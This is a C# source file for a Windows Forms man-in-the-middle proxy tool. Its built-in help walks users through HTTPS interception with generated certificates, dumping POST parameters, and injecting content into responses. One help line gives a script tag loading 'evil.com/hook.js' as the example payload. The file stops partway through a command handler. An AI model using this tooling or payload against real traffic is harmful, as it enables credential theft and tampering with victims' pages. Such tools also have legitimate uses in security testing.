using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading;
using System.Net.Sockets;
using System.Net;
using System.Windows.Forms;
using Microsoft.Win32.SafeHandles;
using System.IO;
using System.Security.Cryptography;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;
using System.Diagnostics;
using System.Security.Authentication;
using System.Text.RegularExpressions;
using appCom;

namespace proxyServer
{
    public partial class Form1 : Form, ISettings, IHelp
    {
        //IHelp Implementation

        private string _helpFile = "";

        public string HelpFile
        {
            get { return _helpFile; }
            set
            {
                if (File.Exists(value)) _helpFile = value;
            }
        }

        //ISettings implementation

        public void LoadSettings(KeyValuePair<string, string> kvp)
        {
            string key = kvp.Key.ToLower();
            string value = kvp.Value.ToLower();

            if (key == "ip") ip = value;
            if (key == "port") port = int.Parse(value);
            if (key == "pending_limit") pendingConnectionLimit = int.Parse(value);
        }

        public void WriteSettings(System.Xml.XmlWriter xml)
        {
            xml.WriteStartElement("settings_start");
            xml.WriteElementString("ip", ip);
            xml.WriteElementString("port", port.ToString());
            xml.WriteElementString("pending_limit", pendingConnectionLimit.ToString());
            xml.WriteEndElement();
        }

        //Main Form Class

        public bool isStarted = false;
        public int pendingConnectionLimit = 3;
        public string ip = "localhost";
        public int port = 8080;
        public ProxyServer server;
        private VConsole ConMod;
        private VPin PinMod;
        private VSettings SetMod;
        public VLogger LogMod;
        public VFilter vf;
        public VMitm mitmHttp;
        public VSslCertification CertMod;
        public VDump DumpMod;
        public VDependencyWatcher VdwMod;
        public VRegEx RegMod;
        public VInject InjectMod;
        public VHelp HelpMod;
        public Client _ipcClient;

        public Form1()
        {
            InitializeComponent();
        }

        private void StartIPCHandler()
        {
            bool canContinue = false;

            foreach (string arg in Environment.GetCommandLineArgs())
            {
                if (arg == "use_ipc")
                {
                    canContinue = true;
                    break;
                }
            }

            if (!canContinue)
            {
                ConMod.WriteLine("No ipc argument specified!");
                _ipcClient = null;
                return;
            }
            Client c = new Client();
            c.ConnectPipe("tut_client_proxy", 1337);
            c.OnMessageReceived += new Client.OnMessageReceivedEventHandler(ReadIPC);
            _ipcClient = c;
        }

        private void ReadIPC(ClientMessageEventArgs e)
        {
            VConsole.ReadLineEventArgs ea = new VConsole.ReadLineEventArgs(e.Message);
            OnCommand(ConMod, ea);
        }

        #region HelperMethods

        public string GetPayload(string payload)
        {
            bool isFile = false;
            if (payload.Length > 3)
            {
                Regex file = new Regex("[a-zA-Z]:\\\\");
                isFile = file.Match(payload).Success;
                if (!isFile)
                {
                    string temp = "";
                    temp = Application.StartupPath + "\\" + payload;
                    isFile = file.Match(temp).Success;
                    if (isFile && File.Exists(temp)) payload = temp;
                }
            }

            if (isFile && File.Exists(payload)) return File.ReadAllText(payload);
            else return payload;
        }

        public VLogger.LogObj CreateLog(string text, VLogger.LogLevel ll)
        {
            VLogger.LogObj lo = new VLogger.LogObj();
            lo.message = text;
            lo.ll = ll;
            lo.r = null;
            lo.resp = null;
            return lo;
        }

        public void CreateServer()
        {
            if (server == null) server = new ProxyServer(ip, port, pendingConnectionLimit, ConMod, this);
        }

        public string[] Ie2sa(IEnumerable<string> input)
        {
            List<string> s = new List<string>();
            foreach (string str in input)
            {
                s.Add(str);
            }

            return s.ToArray();
        }

        public VFilter.Operation S2op(string input)
        {
            input = input.ToLower();
            if (input == "startswith") return VFilter.Operation.StartsWith;
            if (input == "contains") return VFilter.Operation.Contains;
            if (input == "equals") return VFilter.Operation.Equals;
            if (input == "notequals") return VFilter.Operation.NotEquals;

            return VFilter.Operation.Undefined;
        }

        public List<Socket> ListCopy(List<Socket> input)
        {
            List<Socket> result = new List<Socket>();

            foreach (Socket item in input)
            {
                result.Add(item);
            }

            return result;
        }

        public bool IsByteArrayEmpty(byte[] array)
        {
            foreach (byte b in array)
            {
                if (b != 0) return false;
            }

            return true;
        }

        public bool PortVerification(int port)
        {
            if (port < 65535)
                return true;
            return false;
        }

        public bool IpVerification(string input)
        {
            if (input == "any" || input == "loopback" || input == "localhost")
            {
                return true;
            }
            else if (input.Contains("."))
            {
                string[] parts = input.Split('.');
                if (parts.Length == 4)
                {
                    foreach (string part in parts)
                    {
                        for (int i = 0; i < part.Length; i++)
                        {
                            if (!char.IsNumber(part[i])) return false;
                        }
                    }

                    return true;
                }
                else
                {
                    return false;
                }
            }
            else
            {
                return false;
            }
        }

        private void Exit()
        {
            if (isStarted)
            {
                VConsole console = ConMod;
                bool ch = console.ChoicePrompt("Do you really want to exit?" + Environment.NewLine + "The server is still running!");
                if (ch)
                {
                    FinalExit();
                }
            }
            else
            {
                FinalExit();
            }
        }

        private void FinalExit()
        {
            if (_ipcClient != null) _ipcClient.StopPipe();

            if (server != null)
            {
                server.StopServer();
                server.Dispose();
                server = null;
            }

            VdwMod.Dispose();
            VdwMod = null;
            SetMod.Dispose();
            SetMod = null;
            InjectMod.Dispose();
            InjectMod = null;
            RegMod.Dispose();
            RegMod = null;
            mitmHttp.Dispose();
            mitmHttp = null;
            DumpMod.Dispose();
            DumpMod = null;
            CertMod.Dispose();
            CertMod = null;
            LogMod.Dispose();
            LogMod = null;
            vf.Dispose();
            vf = null;
            PinMod.Dispose();
            PinMod = null;
            ConMod.Dispose();
            ConMod = null;
            isStarted = false;
            Environment.Exit(0);
        }

        public bool S2b(string text, bool defaultSecureValue)
        {
            bool result = false;
            String[] positiveKw = { "enable", "on", "yes", "start", "up" };
            String[] negativeKw = { "disable", "off", "no", "stop", "down" };
            text = text.ToLower();
            text = text.Trim();
            if (positiveKw.Contains(text)) result = true;
            if (negativeKw.Contains(text)) result = false;
            if (!positiveKw.Contains(text) && ! negativeKw.Contains(text))
            {
                string def;
                def = (defaultSecureValue) ? "Enabled" : "Disabled";
                result = defaultSecureValue;
                ConMod.WriteLine("[WARNING] Invalid Input!\r\n\t    Setting to the default value: " + def);
            }

            return result;
        }

        private void ServerNotStarted()
        {
            ConMod.WriteLine("[WARNING] Server is not started");
        }

        private void ServiceNotStarted()
        {
            ConMod.WriteLine("[WARNING] Service is not started");
        }

        public bool IsInteger(string value)
        {
            bool result = true;

            for (int i = 0; i < value.Length; i++)
            {
                if (!char.IsNumber(value[i]))
                {
                    result = false;
                    break;
                }
            }

            if (!result)
            {
                ConMod.WriteLine("[ERROR] Input is not a valid number");
            }

            return result;
        }

        public bool IsFloat(string input)
        {
            bool result = true;
            char decimalSeparator = Convert.ToChar(System.Globalization.CultureInfo.CurrentCulture.NumberFormat.NumberDecimalSeparator);

            for (int i = 0; i < input.Length; i++)
            {
                if (!char.IsNumber(input[i]) && input[i] != decimalSeparator)
                {
                    result = false;
                    break;
                }
            }

            if (!result)
            {
                ConMod.WriteLine("[ERROR] Input is not a valid decimal number");
            }

            return result;
        }

        public System.Drawing.Color S2c(string colorName)
        {
            System.Drawing.Color result = System.Drawing.Color.Empty;
            colorName = colorName.ToLower();

            switch(colorName)
            {
                case "black":
                    result = System.Drawing.Color.Black;
                    break;

                case "white":
                    result = System.Drawing.Color.White;
                    break;

                case "green":
                    result = System.Drawing.Color.Lime;
                    break;

                case "blue":
                    result = System.Drawing.Color.Blue;
                    break;

                case "aqua":
                    result = System.Drawing.Color.Aqua;
                    break;

                case "gray":
                    result = System.Drawing.Color.Gray;
                    break;

                case "purple":
                    result = System.Drawing.Color.Purple;
                    break;

                case "yellow":
                    result = System.Drawing.Color.Gold;
                    break;
            }

            return result;
        }

        public string C2s(System.Drawing.Color color)
        {
            string result = "";

            if (color == System.Drawing.Color.Black) result = "black";
            else if (color == System.Drawing.Color.White) result = "white";
            else if (color == System.Drawing.Color.Gold) result = "yellow";
            else if (color == System.Drawing.Color.Lime) result = "green";
            else if (color == System.Drawing.Color.Aqua) result = "aqua";
            else if (color == System.Drawing.Color.Blue) result = "blue";
            else if (color == System.Drawing.Color.Purple) result = "purple";
            else if (color == System.Drawing.Color.Gray) result = "gray";

            return result;
        }

        #endregion

        private void Form1_Shown(object sender, EventArgs e)
        {
            VConsole console = new VConsole(this, VConsole.SyncMode.noSync); // syncIO -- the input line disappears when i click the icon on the taskbar :(
            VDependencyWatcher wd = new VDependencyWatcher(this);
            VdwMod = wd;
            VPin pin = new VPin();
            VLogger logger = new VLogger(console);
            VFilter vfmanager = new VFilter(this, console);
            VMitm mhttp = new VMitm(this, console);
            VSslCertification ssl = new VSslCertification(logger, console);
            VDump dump = new VDump(this, console, logger);
            VRegEx vrx = new VRegEx(logger);
            VInject vi = new VInject(console, vrx, mhttp, wd, this);
            VSettings settings = new VSettings(this, console, pin, logger);
            console.Bind(textBox2, textBox1);
            console.Setup();
            console.SetForeground(System.Drawing.Color.White);
            console.SetBackground(System.Drawing.Color.Black);
            console.SetTextSize((float)12.0);
            console.OnReadLine += new VConsole.ReadLineEventHandler(OnCommand);
            console.SetPrompt("/proxyServer>");
            console.isDebug = true;
            pin.SetConsole(console);
            pin.Exclude("set pin");
            pin.Exclude("cls");
            pin.Exclude("help");
            pin.SetLogger(logger);
            settings.DefineDirectory(Application.StartupPath + "\\profiles");
            logger.started = true;
            logger.printToFile = false;
            logger.SetupLogLevel(true, true, true, true, true);
            logger.SetManager(vfmanager);
            vfmanager.started = true;
            dump.DefineDirectory(Application.StartupPath + "\\Dumps");
            dump.started = true;
            vi.SetManager(vfmanager);
            vi.SetManager(vrx);
            mhttp.SetManager(vfmanager);
            mhttp.SetDumpManager(dump);
            mhttp.SetLogger(logger);
            mhttp.SetInjectionManager(vi);
            mhttp.CreateFilters();
            mhttp.CreateDumps();
            mhttp.CreateInjects();
            mhttp.started = false;
            dump.started = false;
            ssl.started = false;
            wd.StartWatcher();
            ConMod = console;
            PinMod = pin;
            SetMod = settings;
            LogMod = logger;
            vf = vfmanager;
            mitmHttp = mhttp;
            CertMod = ssl;
            DumpMod = dump;
            RegMod = vrx;
            InjectMod = vi;

            //Default filters

            vf.CreateFilter("resp_mime");
            vf.Addfilter("resp_mime", VFilter.Operation.StartsWith, "text/");
            vf.Addfilter("resp_mime", VFilter.Operation.Equals, "application/json");
            vf.Addfilter("resp_mime", VFilter.Operation.Equals, "application/javascript");
            vf.Addfilter("resp_mime", VFilter.Operation.Equals, "application/x-javascript");
            vf.Addfilter("resp_mime", VFilter.Operation.Equals, "application/x-www-form-urlencoded");

            vf.CreateFilter("resp_mime_block");
            vf.Addfilter("resp_mime_block", VFilter.Operation.StartsWith, "video/");

            vf.CreateFilter("mitm_mime_media");
            vf.Addfilter("mitm_mime_media", VFilter.Operation.StartsWith, "image/");
            vf.Addfilter("mitm_mime_media", VFilter.Operation.StartsWith, "audio/");
            vf.Addfilter("mitm_mime_media", VFilter.Operation.StartsWith, "video/");

            //Setup Help

            SetupInteractiveHelp();

            //IPC Handler

            StartIPCHandler();
        }

        private void SetupInteractiveHelp()
        {
            VHelp h = new VHelp(this, ConMod);
            HelpMod = h;
            //Service Registration

            HelpFile = "help\\main.xml";
            InjectMod.HelpFile = "help\\inject.xml";
            RegMod.HelpFile = "help\\regex.xml";
            DumpMod.HelpFile = "help\\dump.xml";
            CertMod.HelpFile = "help\\ssl.xml";
            mitmHttp.HelpFile = "help\\mitm.xml";
            vf.HelpFile = "help\\filter.xml";
            LogMod.HelpFile = "help\\logger.xml";
            h.RegisterServices(this, InjectMod, RegMod, DumpMod, CertMod, mitmHttp, vf, LogMod);

            //MITM SSL Configuration
            h.CreateInteractive("config_ssl_mitm", "Helps To configure HTTPs MITM Attacks");
            h.AddMessage("config_ssl_mitm", "1. Enable MITM\r\ncommand: mitm up", "2. Enable SSL Certification manager\r\ncommand: sslcert_manager up", "3. Enter SSL Cert Man" +
                " Interactive Mode\r\ncommand: sslcert_manager", "4. Generate Certificate\r\ncommand: generate [file_name] [subject_name] [key_length]\r\ne.g" +
                " generate test.cer ah101 2048", "5. Set file path\r\ncommand: set file_path [file path]\r\ne.g set file_path test.cer", "6. Set Protocols\r\ncommand: " +
                "set protocols [protocol names]\r\ne.g set protocols tls,sslv3,sslv2", "7. Test if everything works fine!\r\ncommand: test", "8. Go to main menu\r\ncommand: exit"
                , "9. Start the server\r\ncommand: start", "10. Set HTTPs Mode to MITM\r\ncommand: set mode https mitm");
            h.AddIdle("config_ssl_mitm", 0, 0, 0, 0, 0, 0, 3, 0, 1);
            h.AddTrigger("config_ssl_mitm", () => mitmHttp.started, () => CertMod.started, () => ConMod.GetIntercativeGroup() == "ig.ssl", () => ConMod.prevCommand.StartsWith("generate ")
            , () => CertMod.CertFile != "", () => CertMod.GetProtocols() != SslProtocols.None, () => ConMod.prevCommand == "test", () => ConMod.GetIntercativeGroup() == "ig.null"
            , () => isStarted, () => server.GetMode("https") == ProxyServer.Mode.MITM);

            //MITM Http Configuration

            h.CreateInteractive("config_http_mitm", "Helps To Configure HTTP MITM Attacks");
            h.AddMessage("config_http_mitm", "1. Enable MITM\r\ncommand: mitm up", "2. Start Server\r\ncommand: start", "3. Set HTTP mode to MITM" +
                "\r\ncommand: set mode http mitm");
            h.AddIdle("config_http_mitm", 0, 0, 1);
            h.AddTrigger("config_http_mitm", () => mitmHttp.started, () => isStarted, () => server.GetMode("http") == ProxyServer.Mode.MITM);

            //Post request dumping config

            h.CreateInteractive("config_post_dump", "Helps to configure the dumping of POST requests");
            h.AddMessage("config_post_dump", "1. Enable MITM\r\ncommand: mitm up", "2. Enable Dump\r\ncommand: dump_manager up", "3. Enter MITM Interactive Mode\r\ncommand: mitm",
                "4. Start Post Dump Service\r\ncommand: mitm_postparams_dump up", "5. Check if dumpers are working\r\ncommand: check_dumpers",
                "6. Go to main menu\r\ncommand: exit", "7. Start Server\r\ncommand: start");
            h.AddIdle("config_post_dump", 0,0,0,0,2,0,1);
            h.AddTrigger("config_post_dump", () => mitmHttp.started, () => DumpMod.started, () => ConMod.GetIntercativeGroup() == "ig.mitm",
                () => mitmHttp.CheckServiceState(VMitm.DumpServices.PostParameters), () => ConMod.prevCommand == "check_dumpers",
                () => ConMod.GetIntercativeGroup() == "ig.null", () => isStarted);

            //Hostname based blocking

            h.CreateInteractive("config_host_block", "Helps to configure hostname based blocking");
            h.AddMessage("config_host_block", "1. Enable MITM\r\ncommand: mitm up", "2. Enable Filter manager\r\ncommand: filter_manager up", "3. Enter Filter manager" +
                " Interactive Mode\r\ncommand: filter_manager", "4. Blacklist Host\r\ncommand: setup [filter_name] [condition_type] [value]\r\ne.g" +
                " setup mitm_hostblock_black equals example.com", "5. Check the filter\r\ncommand: show [filter_name]\r\ne.g show mitm_hostblock_black",
                "6. exit to main menu\r\ncommand: exit", "7. Enter MITM Interactive Mode\r\ncommand: mitm", "8. Enable Host Blocking service\r\ncommand: mitm_hostblock up",
                "9. Check if everything is fine!\r\ncommand: check_filters",
                "10. exit to main menu\r\ncommand: exit", "11. Start Server\r\ncommand: start");
            h.AddIdle("config_host_block", 0, 0, 0, 0, 2, 0, 0, 0, 5, 0, 0);
            h.AddTrigger("config_host_block", () => mitmHttp.started, () => vf.started, () => ConMod.GetIntercativeGroup() == "ig.vfman", () => ConMod.prevCommand.StartsWith("setup ")
            , () => ConMod.prevCommand.StartsWith("show"), () => ConMod.GetIntercativeGroup() == "ig.null", () => ConMod.GetIntercativeGroup() == "ig.mitm",
            ()=> mitmHttp.CheckServiceState(VMitm.BlockServices.Host),() => ConMod.prevCommand == "check_filters", () => ConMod.GetIntercativeGroup() == "ig.null", () => isStarted);

            //Injection Config

            h.CreateInteractive("config_inject", "Helps to inject content into a response");
            h.AddMessage("config_inject", "1. Enable MITM\r\ncommand: mitm up", "2. Enter MITM Interactive Mode\r\ncommand: mitm", "3. Enable Injection Manager\r\ncommand:" +
                " mitm_inject_core up", "4. Enable Automatic Injection\r\ncommand: mitm_inject_auto up", "5. Enter Injection Manager Interactive Mode\r\ncommand: " +
                "inject_manager", "6. Set the payload\r\ncommand: set auto_payload [file_name or payload]\r\ne.g set auto_payload <script src=\"evil.com/hook.js\"></script>",
                "7. Check payload\r\ncommand: get auto_payload", "8. Exit to mitm\r\ncommand: exit", "9. Exit to main menu\r\ncommand: exit", "10. Start Server\r\ncommand: start");
            h.AddIdle("config_inject", 0, 0, 0, 0, 0, 0, 2, 0, 0, 1);
            h.AddTrigger("config_inject", () => mitmHttp.started, () => ConMod.GetIntercativeGroup() == "ig.mitm", () => mitmHttp.CheckServiceState(VMitm.InjectServices.Core),
                () => mitmHttp.CheckServiceState(VMitm.InjectServices.AutoInjection), () => ConMod.GetIntercativeGroup() == "ig.inject", () => InjectMod.autoPayload != "",
                () => ConMod.prevCommand == "get auto_payload", () => ConMod.GetIntercativeGroup() == "ig.mitm", () => ConMod.GetIntercativeGroup() == "ig.null", () => isStarted);
        }

        private void kThread()
        {
            TcpListener listener = new TcpListener(IPAddress.Any, 8080);
            listener.Start(2);
            while (true)
            {
                TcpClient client = listener.AcceptTcpClient();
                byte[] buffer = new byte[1024];
                int read = client.GetStream().Read(buffer, 0, buffer.Length);
                string text = Encoding.ASCII.GetString(buffer, 0, read);
                string fLine = text.Split('\n')[0];
                fLine = fLine.Substring(fLine.IndexOf(' '));
                fLine = fLine.Replace("http://", String.Empty);
                fLine = fLine.Replace("https://", String.Empty);
                string host = fLine.Substring(1, fLine.IndexOf('/') - 1);
                fLine = fLine.Substring(0, fLine.IndexOf(' '));
                TcpClient tunnel;
                string payload = text.Replace(host, String.Empty);
                payload = payload.Replace("http://", String.Empty);
                payload = payload.Replace("https://", String.Empty);

                if (fLine.EndsWith(":443"))
                {
                    tunnel = new TcpClient(host, 443);
                    if (!tunnel.Connected) tunnel.Connect(host, 443);
                }
                else
                {
                    tunnel = new TcpClient(host, 80);
                    if (!tunnel.Connected) tunnel.Connect(host, 80);
                }

                StreamWriter sw = new StreamWriter(tunnel.GetStream());
                sw.WriteLine(payload);
                byte[] _buffer = new byte[1024];
                int bytesRead = tunnel.GetStream().Read(_buffer, 0, _buffer.Length);
                client.GetStream().Write(_buffer, 0, bytesRead);
            }
        }

        private void OnCommand(object obj, VConsole.ReadLineEventArgs e)
        {
            VConsole console = (VConsole)obj;
            VPin pinManager = PinMod;
            string command = e.Text.Trim();

            CommandObj c = new CommandObj();
            c.console = console;
            c.pinManager = pinManager;
            c.command = command;

            Thread t = new Thread(new ParameterizedThreadStart(CommandThread));
            t.Start(c);
        }

        private void CommandThread(object obj)
        {
            CommandObj o = (CommandObj)obj;
            string command = o.command;
            VConsole console = o.console;
            VPin pinManager = o.pinManager;
            VLogger logger = LogMod;

            if (console.GetIntercativeGroup() == "ig.inject")
            {
                VInject vi = InjectMod;

                if (command.StartsWith("set auto_payload "))
                {
                    string opt = command.Substring(17);
                    string pl = GetPayload(opt);
                    vi.autoPayload = pl;
                }
                else if (command == "get auto_payload")
                {
                    console.WriteLine("Auto Payload: " + vi.autoPayload, "ig.inject");
                }
                else if (command.StartsWith("add match_payload "))
                {
                    string opt = command.Substring(18);
                    if (!opt.Contains(" "))
                    {
                        logger.Log("Wrong number of arguments!", VLogger.LogLevel.error);
                        return;
                    }
                    string payload = opt.Substring(opt.IndexOf(' ') + 1);
                    string filterName = opt.Substring(0, opt.IndexOf(' '));
                    payload = GetPayload(payload);
                    if (vi.AssignPayload(filterName, payload))
                    {
                        logger.Log("Payload added!", VLogger.LogLevel.information);
                    }
                }
                else if (command.StartsWith("remove match_payload "))
                {
                    string opt = command.Substring(21);
                    if (vi.RemovePayload(opt))
                    {
                        logger.Log("Payload removed!", VLogger.LogLevel.information);
                    }
                }
                else if (command == "list_payload")
                {
                    vi.ListPayload();
                }
                else if (command.StartsWith("add media_replace "))
                {
                    string opt = command.Substring(18);
                    string payload = opt.Substring(opt.IndexOf(' ') + 1);
                    string filterName = opt.Substring(0, opt.IndexOf(' '));
                    if (!File.Exists(payload))
                    {
                        logger.Log("File doesn't exist", VLogger.LogLevel.error);
                        return;
                    }
                    if (vi.AssignFilterToFile(filterName, payload))
                    {
                        logger.Log("Payload added!", VLogger.LogLevel.information);
                    }
                }
                else if (command.StartsWith("remove media_replace "))
                {
                    string opt = command.Substring(21);
                    if (vi.RemoveFilterToFile(opt))
                    {
                        logger.Log("Payload removed!", VLogger.LogLevel.information);
                    }
                }
                else if (command == "list media_replace")
                {
                    vi.FilterToFileList();
                }
                else if (command.StartsWith("bind regex "))
                {
                    string opt = command.Substring(11);
                    string filterName = opt.Substring(0, opt.IndexOf(' '));
                    string targetName = opt.Substring(opt.IndexOf(' ') + 1);

                    if (vi.BindRegEx(filterName, targetName))
                    {
                        logger.Log("Regex added!", VLogger.LogLevel.information);
                    }
                    else logger.Log("Failed to add regex!", VLogger.LogLevel.error);
                }
                else if (command.StartsWith("unbind regex "))
                {
                    string opt = command.Substring(13);
                    if (vi.UnBindRegEx(opt)) logger.Log("Regex Removed!", VLogger.LogLevel.information);
                    else logger.Log("Regex remove failed!", VLogger.LogLevel.error);
                }
                else if (command.StartsWith("bind filter "))
                {
                    string opt = command.Substring(12);
                    string filterName = opt.Substring(0, opt.IndexOf(' '));
                    string targetName = opt.Substring(opt.IndexOf(' ') + 1);

                    if (vi.BindFilter(filterName, targetName))
                    {
                        logger.Log("Filter added!", VLogger.LogLevel.information);
                    }
                    else logger.Log("Failed to add filter!", VLogger.LogLevel.error);
                }
                else if (command.StartsWith("unbind filter "))
                {
                    string opt = command.Substring(14);
                    if (vi.UnBindFilter(opt)) logger.Log("Filter Removed!", VLogger.LogLevel.information);
                    else logger.Log("Filter remove failed!", VLogger.LogLevel.error);
                }
                else if (command == "list bind regex")
                {
                    vi.BindListR();
                }
                else if (command == "list bind filter")
                {
                    vi.BindList();
                }
                else if (command.StartsWith("set match_engine "))
                {
                    string opt = command.Substring(17);
                    opt = opt.ToLower();
                    if (opt == "regex") vi.mEngine = VInject.MatchEngine.RegEx;
                    else if (opt == "filter") vi.mEngine = VInject.MatchEngine.Filters;
                    else
                    {
                        logger.Log("Invalid Match Engine name!", VLogger.LogLevel.error);
                        return;
                    }

                    logger.Log("Match engine set to " + opt.ToUpper(), VLogger.LogLevel.information);
                }
                else if (command.StartsWith("set match_option "))
                {
                    string opt = command.Substring(17);
                    opt = opt.ToLower();
                    if (opt == "both") vi.mOption = VInject.MatchOptions.Both;
                    else if (opt == "and") vi.mOption = VInject.MatchOptions.And;
                    else if (opt == "or") vi.mOption = VInject.MatchOptions.Or;
                    else
                    {
                        logger.Log("Invalid Match Option name!", VLogger.LogLevel.error);
                        return;
                    }

                    logger.Log("Match option set to " + opt.ToUpper(), VLogger.LogLevel.information);
                }
                else if (command.StartsWith("set match_mode "))
                {
                    string opt = command.Substring(15);
                    VInject.MatchMode mode = VInject.MatchMode.InjectAfter;
                    opt = opt.ToLower();
                    if (opt == "before") mode = VInject.MatchMode.InjectBefore;
                    else if (opt == "replace") mode = VInject.MatchMode.Replace;
                    else if (opt == "after") mode = VInject.MatchMode.InjectAfter;
                    else
                    {
                        logger.Log("Invalid match mode name!", VLogger.LogLevel.error);
                        return;
                    }

                    vi.mMode = mode;
                    logger.Log("Match mode set to " + opt.ToUpper(), VLogger.LogLevel.information);
                }
                else if (command == "cls") console.Clear();
                else if (command == "exit")
                {
                    console.SetInteractiveGroup("ig.mitm");
                    console.SetPrompt(mitmHttp.pRestore);
                    console.Clear();
                    mitmHttp.pRestore = "/proxyServer>";
                }
                else if (command.StartsWith("help "))
                {
                    string rest = command.Substring(5);
                    if (!rest.StartsWith("int") && !rest.StartsWith("param ") && rest != "param")
                    {
                        HelpMod.GetHelp(rest, VHelp.Type.Command, InjectMod);
                    }
                    else if (rest.StartsWith("param "))
                    {
                        rest = rest.Substring(6);
                        HelpMod.GetHelp(rest, VHelp.Type.ParameterList, InjectMod);
                    }
                    else if (rest == "param")
                    {
                        console.WriteLine("Type help param [parameter name] -to get help about a parameter listed by the help of a command", "ig.mitm");
                    }
                }
                else if (command == "help")
                {
                    HelpMod.ListAll(InjectMod);
                }
                else
                {
                    logger.Log("Invalid Injection Manager Command!", VLogger.LogLevel.error);
                }

                if (HelpMod.GetCommandUpdates) HelpMod.OnCommand(command);

                return;
            }

            if (console.GetIntercativeGroup() == "ig.regex")
            {
                if (command.StartsWith("add group "))
                {
                    string name = command.Substring(10);
                    if (name.Contains(" "))
                    {
                        logger.Log("Group Name can't contain spaces, you may replace them with dash \"-\"", VLogger.LogLevel.error);
                        return;
                    }
                    bool result = RegMod.Add(name);
                    if (result) logger.Log("Group successfully added to RegEx", VLogger.LogLevel.information);
                    else logger.Log("Failed to add group to RegEx\r\nPerhaps group already exists!", VLogger.LogLevel.error);
                }
                else if (command.StartsWith("add exp "))
                {
                    string opt = command.Substring(8);
                    int firstSpace = opt.IndexOf(' ');
                    string gName = opt.Substring(0, firstSpace);
                    string exp = opt.Substring(firstSpace + 1, opt.Length - firstSpace - 1); // + 1 to chop the extra beginning space
                    bool result = RegMod.AddExpression(gName, exp);
                    if (result) logger.Log("Expression added to group!", VLogger.LogLevel.information);
                    else logger.Log("Failed to add expression to group!\r\nPerhaps the group doesn't exists!", VLogger.LogLevel.error);
                }
                else if (command.StartsWith("remove exp "))
                {
                    string opt = command.Substring(11);
                    int firstSpace = opt.IndexOf(' ');
                    string gName = opt.Substring(0, firstSpace);
                    string exp = opt.Substring(firstSpace + 1, opt.Length - firstSpace - 1); // +1 to chop the extra beginning space
                    bool result = RegMod.RemoveExpression(gName, exp);
                    if (result) logger.Log("Expression removed from group!", VLogger.LogLevel.information);
                    else logger.Log("Failed to remove expression from group!\r\nPerhaps the group and/or expression doesn't exists!", VLogger.LogLevel.error);
                }
                else if (command.StartsWith("remove group "))
                {
                    string name = command.Substring(13);
                    if (name.Contains(" "))
                    {
                        logger.Log("Group Name can't contain spaces, you may replace them with dash \"-\"", VLogger.LogLevel.error);
                        return;
                    }
                    bool result = RegMod.Remove(name);
                    if (result) logger.Log("Group successfully removed from RegEx", VLogger.LogLevel.information);
                    else logger.Log("Failed to remove group from RegEx\r\nPerhaps group doesn't exists!", VLogger.LogLevel.error);
                }
                else if (command == "list group")
                {
                    string text = RegMod.ListGroups();
                    logger.Log(text, VLogger.LogLevel.information);
                }
                else if (command.StartsWith("list exp "))
                {
                    string opt = command.Substring(9);
                    string text = RegMod.ListExpressions(opt);
                    if (text != null) logger.Log(text, VLogger.LogLevel.information);
                }
                else if (command == "cls") console.Clear();
                else if (command == "exit")
                {
                    console.SetPrompt(RegMod.pRestore);
                    RegMod.pRestore = "";
                    RegMod.selfInteractive = false;
                    console.SetInteractiveGroup("ig.null");
                    console.Clear();
                }
                else if (command.StartsWith("help "))
                {
                    string rest = command.Substring(5);
                    if (!rest.StartsWith("int") && !rest.StartsWith("param ") && rest != "param")
                    {
                        HelpMod.GetHelp(rest, VHelp.Type.Command, RegMod);
                    }
                    else if (rest.StartsWith("param "))
                    {
                        rest = rest.Substring(6);
                        HelpMod.GetHelp(rest, VHelp.Type.ParameterList, RegMod);
                    }
                    else if (rest == "param")
                    {
                        console.WriteLine("Type help param [parameter name] -to get help about a parameter listed by the help of a command", "ig.mitm");
                    }
                }
                else if (command == "help")
                {
                    HelpMod.ListAll(RegMod);
                }
                else
                {
                    logger.Log("Invalid RegEx Manager Command!", VLogger.LogLevel.error);
                }

                if (HelpMod.GetCommandUpdates) HelpMod.OnCommand(command);

                return;
            }

            if (console.GetIntercativeGroup() == "ig.dump")
            {
                if (command.StartsWith("define_directory "))
                {
                    string dir = command.Substring(17);
                    DumpMod.DefineDirectory(dir);
                }
                else if (command.StartsWith("add file "))
                {
                    string args = command.Substring(9);
                    if (args == "")
                    {
                        logger.Log("No Parameter(s) specified!", VLogger.LogLevel.error);
                        return;
                    }
                    if (args.Contains(" "))
                    {
                        string[] split = args.Split(' ');
                        if (split.Length != 2)
                        {
                            logger.Log("Wrong number of parameters!", VLogger.LogLevel.error);
                            return;
                        }

                        string file = split[0];
                        string fname = split[1];
                        DumpMod.AddFile(file, fname);
                    }
                    else DumpMod.AddFile(args);
                }
                else if (command.StartsWith("add friendly_name "))
                {
                    string args = command.Substring(18);
                    if (args == "")
                    {
                        logger.Log("No parameters specified!", VLogger.LogLevel.error);
                        return;
                    }

                    if (args.Contains(" "))
                    {
                        string[] split = args.Split(' ');
                        string fpath = split[0];
                        string fname = split[1];
                        DumpMod.AssignFriendlyName(fpath, fname);
                    }
                    else
                    {
                        logger.Log("Wrong number of arguments!", VLogger.LogLevel.error);
                    }
                }
                else if (command.StartsWith("remove friendly_name "))
                {
                    string fname = command.Substring(21);
                    DumpMod.RemoveFriendlyName(fname);
                }
                else if (command.StartsWith("bind "))
                {
                    string args = command.Substring(5);
                    if (args == "")
                    {
                        logger.Log("No arguments specified!", VLogger.LogLevel.error);
                        return;
                    }

                    if (args.Contains(" "))
                    {
                        string[] split = args.Split(' ');
                        string fname = split[0];
                        string targetParam = split[1];
                        int id = DumpMod.GetIndexByFilePath(targetParam);
                        if (id == -1) id = DumpMod.GetIndexByFriendlyName(targetParam);
                        if (id == -1)
                        {
                            logger.Log("Failed to retrieve array ID", VLogger.LogLevel.error);
                            return;
                        }
                        DumpMod.BindFilter(fname, id);
                    }
                    else
                    {
                        logger.Log("Wrong number of arguments!", VLogger.LogLevel.error);
                    }
                }
                else if (command.StartsWith("unbind "))
                {
                    string fname = command.Substring(7);
                    if (fname == "")
                    {
                        logger.Log("No parameter specified!", VLogger.LogLevel.error);
                        return;
                    }

                    DumpMod.UnBindFilter(fname);
                }
                else if (command.StartsWith("bind_list"))
                {
                    DumpMod.BindList();
                }
                else if (command.StartsWith("remove file "))
                {
                    string fname = command.Substring(12);
                    if (fname == "")
                    {
                        logger.Log("No parameter specified!", VLogger.LogLevel.error);
                        return;
                    }

                    int id = DumpMod.GetIndexByFilePath(fname);
                    if (id == -1) id = DumpMod.GetIndexByFriendlyName(fname);
                    if (id == -1)
                    {
